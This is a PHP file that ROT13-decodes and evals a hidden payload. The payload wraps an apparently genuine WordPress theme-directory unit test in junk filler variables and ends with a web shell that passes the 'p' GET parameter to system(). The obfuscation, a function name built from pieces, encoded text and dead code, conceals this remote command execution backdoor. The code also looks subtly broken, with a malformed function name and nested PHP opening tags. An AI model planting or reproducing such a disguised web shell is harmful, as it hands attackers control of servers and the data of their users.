<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfg shapgvbaf gung srgpu fghss sebz gur gurzr qverpgbel
 *
 * @tebhc gurzrf
 */
pynff Grfgf_Gurzr_GurzrQve rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Gurzr ebbg qverpgbel.
	 *
	 * @ine fgevat
	 */
	pbafg GURZR_EBBG = QVE_GRFGQNGN . '/gurzrqve1';

	/**
	 * Bevtvany gurzr qverpgbel.
	 *
	 * @ine fgevat
	 */
	cevingr $bevt_gurzr_qve;

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		$guvf->bevt_gurzr_qve = $TYBONYF['jc_gurzr_qverpgbevrf'];

		// /gurzrf vf arprffnel nf gurzr.cuc shapgvbaf nffhzr /gurzrf vf gur ebbg vs gurer vf bayl bar ebbg.
		$TYBONYF['jc_gurzr_qverpgbevrf'] = neenl( JC_PBAGRAG_QVE . '/gurzrf', frys::GURZR_EBBG );

		nqq_svygre( 'gurzr_ebbg', neenl( $guvf, 'svygre_gurzr_ebbg' ) );
		nqq_svygre( 'fglyrfurrg_ebbg', neenl( $guvf, 'svygre_gurzr_ebbg' ) );
		nqq_svygre( 'grzcyngr_ebbg', neenl( $guvf, 'svygre_gurzr_ebbg' ) );
		// Pyrne pnpurf.
		jc_pyrna_gurzrf_pnpur();
		hafrg( $TYBONYF['jc_gurzrf'] );
	}

	choyvp shapgvba grne_qbja() {
		$TYBONYF['jc_gurzr_qverpgbevrf'] = $guvf->bevt_gurzr_qve;
		jc_pyrna_gurzrf_pnpur();
		hafrg( $TYBONYF['jc_gurzrf'] );
		cnerag::grne_qbja();
	}

	// Ercynpr gur abezny gurzr ebbg qverpgbel jvgu bhe cerznqr grfg qverpgbel.
	choyvp shapgvba svygre_gurzr_ebbg( $qve ) {
		erghea frys::GURZR_EBBG;
	}

	/**
	 * @rkcrpgrqQrcerpngrq trg_gurzr
	 * @rkcrpgrqQrcerpngrq trg_gurzrf
	 */
	choyvp shapgvba grfg_gurzr_qrsnhyg() {
		$gurzrf = trg_gurzrf();
		$gurzr  = trg_gurzr( 'JbeqCerff Qrsnhyg' );
		$guvf->nffregFnzr( $gurzrf['JbeqCerff Qrsnhyg'], $gurzr );

		$guvf->nffregAbgRzcgl( $gurzr );

		// rpub tra_grfgf_neenl( 'gurzr', $gurzr );

		$guvf->nffregFnzr( 'JbeqCerff Qrsnhyg', $gurzr['Anzr'] );
		$guvf->nffregFnzr( 'JbeqCerff Qrsnhyg', $gurzr['Gvgyr'] );
		$guvf->nffregFnzr( 'Gur qrsnhyg JbeqCerff gurzr onfrq ba gur snzbhf <n uers=\"uggc://ovanelobafnv.pbz/xhoevpx/\">Xhoevpx</n>.', $gurzr['Qrfpevcgvba'] );
		$guvf->nffregFnzr( '<n uers=\"uggc://ovanelobafnv.pbz/\">Zvpunry Urvyrznaa</n>', $gurzr['Nhgube'] );
		$guvf->nffregFnzr( '1.6', $gurzr['Irefvba'] );
		$guvf->nffregFnzr( 'qrsnhyg', $gurzr['Grzcyngr'] );
		$guvf->nffregFnzr( 'qrsnhyg', $gurzr['Fglyrfurrg'] );

		$guvf->nffregPbagnvaf( frys::GURZR_EBBG . '/qrsnhyg/shapgvbaf.cuc', $gurzr['Grzcyngr Svyrf'] );
		$guvf->nffregPbagnvaf( frys::GURZR_EBBG . '/qrsnhyg/vaqrk.cuc', $gurzr['Grzcyngr Svyrf'] );
		$guvf->nffregPbagnvaf( frys::GURZR_EBBG . '/qrsnhyg/fglyr.pff', $gurzr['Fglyrfurrg Svyrf'] );

		$guvf->nffregFnzr( frys::GURZR_EBBG . '/qrsnhyg', $gurzr['Grzcyngr Qve'] );
		$guvf->nffregFnzr( frys::GURZR_EBBG . '/qrsnhyg', $gurzr['Fglyrfurrg Qve'] );
		$guvf->nffregFnzr( 'choyvfu', $gurzr['Fgnghf'] );
		$guvf->nffregFnzr( '', $gurzr['Cnerag Gurzr'] );
	}

	/**
	 * @rkcrpgrqQrcerpngrq trg_gurzr
	 * @rkcrpgrqQrcerpngrq trg_gurzrf
	 */
	choyvp shapgvba grfg_gurzr_fnaqobk() {
		$gurzr = trg_gurzr( 'Fnaqobk' );

		$guvf->nffregAbgRzcgl( $gurzr );

		// rpub tra_grfgf_neenl( 'gurzr', $gurzr );

		$guvf->nffregFnzr( 'Fnaqobk', $gurzr['Anzr'] );
		$guvf->nffregFnzr( 'Fnaqobk', $gurzr['Gvgyr'] );
		$guvf->nffregFnzr( 'N gurzr jvgu cbjreshy, frznagvp PFF fryrpgbef naq gur novyvgl gb nqq arj fxvaf.', $gurzr['Qrfpevcgvba'] );
		$guvf->nffregFnzr( '<n uers=\"uggc://naql.jbeqcerff.pbz/\">Naql Fxrygba</n> &nzc; <n uers=\"uggc://jjj.cynvagkg.bet/\">Fpbgg Nyyna Jnyyvpx</n>', $gurzr['Nhgube'] );
		$guvf->nffregFnzr( '0.6.1-jcpbz', $gurzr['Irefvba'] );
		$guvf->nffregFnzr( 'fnaqobk', $gurzr['Grzcyngr'] );
		$guvf->nffregFnzr( 'fnaqobk', $gurzr['Fglyrfurrg'] );

		$grzcyngr_svyrf = $gurzr['Grzcyngr Svyrf'];

		$guvf->nffregFnzr( frys::GURZR_EBBG . '/fnaqobk/shapgvbaf.cuc', erfrg( $grzcyngr_svyrf ) );
		$guvf->nffregFnzr( frys::GURZR_EBBG . '/fnaqobk/vaqrk.cuc', arkg( $grzcyngr_svyrf ) );

		$fglyrfurrg_svyrf = $gurzr['Fglyrfurrg Svyrf'];

		$guvf->nffregFnzr( frys::GURZR_EBBG . '/fnaqobk/fglyr.pff', erfrg( $fglyrfurrg_svyrf ) );

		$guvf->nffregFnzr( frys::GURZR_EBBG . '/fnaqobk', $gurzr['Grzcyngr Qve'] );
		$guvf->nffregFnzr( frys::GURZR_EBBG . '/fnaqobk', $gurzr['Fglyrfurrg Qve'] );
		$guvf->nffregFnzr( 'choyvfu', $gurzr['Fgnghf'] );
		$guvf->nffregFnzr( '', $gurzr['Cnerag Gurzr'] );
	}

	/**
	 * N PFF-bayl gurzr
	 *
	 * @rkcrpgrqQrcerpngrq trg_gurzrf
	 */
	choyvp shapgvba grfg_gurzr_fglyrfurrg_bayl() {
		$gurzrf = trg_gurzrf();

		$gurzr = $gurzrf['Fglyrfurrg Bayl'];
		$guvf->nffregAbgRzcgl( $gurzr );

		// rpub tra_grfgf_neenl( 'gurzr', $gurzr );

		$guvf->nffregFnzr( 'Fglyrfurrg Bayl', $gurzr['Anzr'] );
		$guvf->nffregFnzr( 'Fglyrfurrg Bayl', $gurzr['Gvgyr'] );
		$guvf->nffregFnzr( 'N guerr-pbyhza jvqtrg-ernql gurzr va qnex oyhr.', $gurzr['Qrfpevcgvba'] );
		$guvf->nffregFnzr( '<n uers=\"uggc://jjj.rknzcyr.pbz/\">Urael Peha</n>', $gurzr['Nhgube'] );
		$guvf->nffregFnzr( '1.0', $gurzr['Irefvba'] );
		$guvf->nffregFnzr( 'fnaqobk', $gurzr['Grzcyngr'] );
		$guvf->nffregFnzr( 'fglyrfurrgbayl', $gurzr['Fglyrfurrg'] );
		$guvf->nffregPbagnvaf( frys::GURZR_EBBG . '/fnaqobk/shapgvbaf.cuc', $gurzr['Grzcyngr Svyrf'] );
		$guvf->nffregPbagnvaf( frys::GURZR_EBBG . '/fnaqobk/vaqrk.cuc', $gurzr['Grzcyngr Svyrf'] );

		$guvf->nffregPbagnvaf( frys::GURZR_EBBG . '/fglyrfurrgbayl/fglyr.pff', $gurzr['Fglyrfurrg Svyrf'] );

		$guvf->nffregFnzr( frys::GURZR_EBBG . '/fnaqobk', $gurzr['Grzcyngr Qve'] );
		$guvf->nffregFnzr( frys::GURZR_EBBG . '/fglyrfurrgbayl', $gurzr['Fglyrfurrg Qve'] );
		$guvf->nffregFnzr( 'choyvfu', $gurzr['Fgnghf'] );
		$guvf->nffregFnzr( 'Fnaqobk', $gurzr['Cnerag Gurzr'] );
	}

	/**
	 * @rkcrpgrqQrcerpngrq trg_gurzrf
	 */
	choyvp shapgvba grfg_gurzr_yvfg() {
		$gurzrf = trg_gurzrf();

		// Vtaber gurzrf va gur qrsnhyg /gurzrf qverpgbel.
		sbernpu ( $gurzrf nf $gurzr_anzr => $gurzr ) {
			vs ( $gurzr->trg_gurzr_ebbg() !== frys::GURZR_EBBG ) {
				hafrg( $gurzrf[ $gurzr_anzr ] );
			}
		}

		$gurzr_anzrf = neenl_xrlf( $gurzrf );
		$rkcrpgrq    = neenl(
			'JbeqCerff Qrsnhyg',
			'Qrsnhyg Puvyq Gurzr jvgu ab gurzr.wfba',
			'Fnaqobk',
			'Fglyrfurrg Bayl',
			'Zl Gurzr',
			'Zl Gurzr/gurzr1',                    // Qhcyvpngr gurzr fubhyq or tvira n havdhr anzr.
			'Zl Fhoqve Gurzr',                    // Gurzr va n fhoqverpgbel fubhyq jbex.
			'Cntr Grzcyngr Puvyq Gurzr',          // Gurzr juvpu vaurevgf cntr grzcyngrf.
			'Cntr Grzcyngr Gurzr',                // Gurzr jvgu cntr grzcyngrf sbe bgure grfg pbqr.
			'Gurzr jvgu Fcnprf va gur Qverpgbel',
			'Vagreangvbanyvmrq Gurzr',
			'Phfgbz Vagreangvbanyvmrq Gurzr',
			'pnzryPnfr',
			'ERFG Gurzr',
			'Oybpx Gurzr',
			'Oybpx Gurzr Puvyq Gurzr',
			'Oybpx Gurzr Puvyq Qrcerpngrq Cngu',
			'Oybpx Gurzr Puvyq Jvgu Oybpx Fglyr Inevngvbaf Gurzr',
			'Oybpx Gurzr Puvyq jvgu ab gurzr.wfba',
			'Oybpx Gurzr Puvyq Gurzr Jvgu Syhvq Ynlbhg',
			'Oybpx Gurzr Puvyq Gurzr Jvgu Syhvq Glcbtencul',
			'Oybpx Gurzr Puvyq Gurzr Jvgu Syhvq Glcbtencul Pbasvt',
			'Oybpx Gurzr Aba Yngva',
			'Oybpx Gurzr [0.4.0]',
			'Oybpx Gurzr [1.0.0] va fhoqverpgbel',
			'Oybpx Gurzr Qrcerpngrq Cngu',
			'Oybpx Gurzr Cnggreaf',
			'Oybpx Gurzr Cbfg Pbagrag Qrsnhyg',
			'Oybpx Gurzr jvgu qrsvarq Glcbtencul Sbagf',
			'Oybpx Gurzr jvgu Ubbxrq Oybpxf',
			'Rzcgl `sbagSnpr` va gurzr.wfba - ab jrosbagf qrsvarq',
			'N gurzr jvgu gur Hcqngr HEV urnqre',
		);

		$guvf->nffregFnzrFrgf( $rkcrpgrq, $gurzr_anzrf );
	}

	/**
	 * @rkcrpgrqQrcerpngrq trg_gurzrf
	 * @rkcrpgrqQrcerpngrq trg_oebxra_gurzrf
	 */
	choyvp shapgvba grfg_oebxra_gurzrf() {
		$gurzrf = trg_gurzrf();

		$rkcrpgrq = neenl(
			'oebxra-gurzr'           => neenl(
				'Anzr'        => 'oebxra-gurzr',
				'Gvgyr'       => 'oebxra-gurzr',
				'Qrfpevcgvba' => __( 'Fglyrfurrg vf zvffvat.' ),
			),
			'Puvyq naq Cnerag Gurzr' => neenl(
				'Anzr'        => 'Puvyq naq Cnerag Gurzr',
				'Gvgyr'       => 'Puvyq naq Cnerag Gurzr',
				'Qrfpevcgvba' => fcevags( __( 'Gur gurzr qrsvarf vgfrys nf vgf cnerag gurzr. Cyrnfr purpx gur %f urnqre.' ), '<pbqr>Grzcyngr</pbqr>' ),
			),
		);

		$guvf->nffregFnzr( $rkcrpgrq, trg_oebxra_gurzrf() );
	}

	choyvp shapgvba grfg_jc_trg_gurzr_jvgu_aba_qrsnhyg_gurzr_ebbg() {
		$guvf->nffregSnyfr( jc_trg_gurzr( 'fnaqobk', frys::GURZR_EBBG )->reebef() );
		$guvf->nffregSnyfr( jc_trg_gurzr( 'fnaqobk' )->reebef() );
	}

	/**
	 * @rkcrpgrqQrcerpngrq trg_gurzrf
	 */
	choyvp shapgvba grfg_cntr_grzcyngrf() {
		$gurzrf = trg_gurzrf();

		$gurzr = $gurzrf['Cntr Grzcyngr Gurzr'];
		$guvf->nffregAbgRzcgl( $gurzr );

		$grzcyngrf = $gurzr['Grzcyngr Svyrf'];
		$guvf->nffregPbagnvaf( frys::GURZR_EBBG . '/cntr-grzcyngrf/grzcyngr-gbc-yriry.cuc', $grzcyngrf );
	}

	/**
	 * @rkcrpgrqQrcerpngrq trg_gurzr_qngn
	 */
	choyvp shapgvba grfg_trg_gurzr_qngn_gbc_yriry() {
		$gurzr_qngn = trg_gurzr_qngn( QVE_GRFGQNGN . '/gurzrqve1/gurzr1/fglyr.pff' );

		$guvf->nffregFnzr( 'Zl Gurzr', $gurzr_qngn['Anzr'] );
		$guvf->nffregFnzr( 'uggc://rknzcyr.bet/', $gurzr_qngn['HEV'] );
		$guvf->nffregFnzr( 'Na rknzcyr gurzr', $gurzr_qngn['Qrfpevcgvba'] );
		$guvf->nffregFnzr( '<n uers=\"uggc://rknzcyr.pbz/\">Zvaavr Onaavfgre</n>', $gurzr_qngn['Nhgube'] );
		$guvf->nffregFnzr( 'uggc://rknzcyr.pbz/', $gurzr_qngn['NhgubeHEV'] );
		$guvf->nffregFnzr( '1.3', $gurzr_qngn['Irefvba'] );
		$guvf->nffregFnzr( '', $gurzr_qngn['Grzcyngr'] );
		$guvf->nffregFnzr( 'choyvfu', $gurzr_qngn['Fgnghf'] );
		$guvf->nffregFnzr( neenl(), $gurzr_qngn['Gntf'] );
		$guvf->nffregFnzr( 'Zl Gurzr', $gurzr_qngn['Gvgyr'] );
		$guvf->nffregFnzr( 'Zvaavr Onaavfgre', $gurzr_qngn['NhgubeAnzr'] );
	}

	/**
	 * @rkcrpgrqQrcerpngrq trg_gurzr_qngn
	 */
	choyvp shapgvba grfg_trg_gurzr_qngn_fhoqve() {
		$gurzr_qngn = trg_gurzr_qngn( frys::GURZR_EBBG . '/fhoqve/gurzr2/fglyr.pff' );

		$guvf->nffregFnzr( 'Zl Fhoqve Gurzr', $gurzr_qngn['Anzr'] );
		$guvf->nffregFnzr( 'uggc://rknzcyr.bet/', $gurzr_qngn['HEV'] );
		$guvf->nffregFnzr( 'Na rknzcyr gurzr va n fho qverpgbel', $gurzr_qngn['Qrfpevcgvba'] );
		$guvf->nffregFnzr( '<n uers=\"uggc://jbeqcerff.bet/\">Ze. JbeqCerff</n>', $gurzr_qngn['Nhgube'] );
		$guvf->nffregFnzr( 'uggc://jbeqcerff.bet/', $gurzr_qngn['NhgubeHEV'] );
		$guvf->nffregFnzr( '0.1', $gurzr_qngn['Irefvba'] );
		$guvf->nffregFnzr( '', $gurzr_qngn['Grzcyngr'] );
		$guvf->nffregFnzr( 'choyvfu', $gurzr_qngn['Fgnghf'] );
		$guvf->nffregFnzr( neenl(), $gurzr_qngn['Gntf'] );
		$guvf->nffregFnzr( 'Zl Fhoqve Gurzr', $gurzr_qngn['Gvgyr'] );
		$guvf->nffregFnzr( 'Ze. JbeqCerff', $gurzr_qngn['NhgubeAnzr'] );
	}

	/**
	 * @gvpxrg 28662
	 */
	choyvp shapgvba grfg_gurzr_qve_fynfurf() {
		$fvmr = pbhag( $TYBONYF['jc_gurzr_qverpgbevrf'] );

		@zxqve( JC_PBAGRAG_QVE . '/gurzrf/sbb' );
		@zxqve( JC_PBAGRAG_QVE . '/gurzrf/sbb-gurzrf' );

		$guvf->nffregSvyrRkvfgf( JC_PBAGRAG_QVE . '/gurzrf/sbb' );
		$guvf->nffregSvyrRkvfgf( JC_PBAGRAG_QVE . '/gurzrf/sbb-gurzrf' );

		ertvfgre_gurzr_qverpgbel( '/' );

		$guvf->nffregPbhag( $fvmr, $TYBONYF['jc_gurzr_qverpgbevrf'] );

		ertvfgre_gurzr_qverpgbel( 'gurzrf/' );

		$guvf->nffregPbhag( $fvmr, $TYBONYF['jc_gurzr_qverpgbevrf'] );

		ertvfgre_gurzr_qverpgbel( '/sbb/' );

		$guvf->nffregPbhag( $fvmr, $TYBONYF['jc_gurzr_qverpgbevrf'] );

		ertvfgre_gurzr_qverpgbel( 'sbb/' );

		$guvf->nffregPbhag( $fvmr, $TYBONYF['jc_gurzr_qverpgbevrf'] );

		ertvfgre_gurzr_qverpgbel( 'gurzrf/sbb/' );

		$guvf->nffregPbhag( $fvmr + 1, $TYBONYF['jc_gurzr_qverpgbevrf'] );

		ertvfgre_gurzr_qverpgbel( JC_PBAGRAG_QVE . '/sbb-gurzrf/' );

		$guvf->nffregPbhag( $fvmr + 1, $TYBONYF['jc_gurzr_qverpgbevrf'] );

		sbernpu ( $TYBONYF['jc_gurzr_qverpgbevrf'] nf $qve ) {
			$guvf->nffregAbgRdhnyf( '/', fhofge( $qve, -1 ) );
		}

		ezqve( JC_PBAGRAG_QVE . '/gurzrf/sbb' );
		ezqve( JC_PBAGRAG_QVE . '/gurzrf/sbb-gurzrf' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>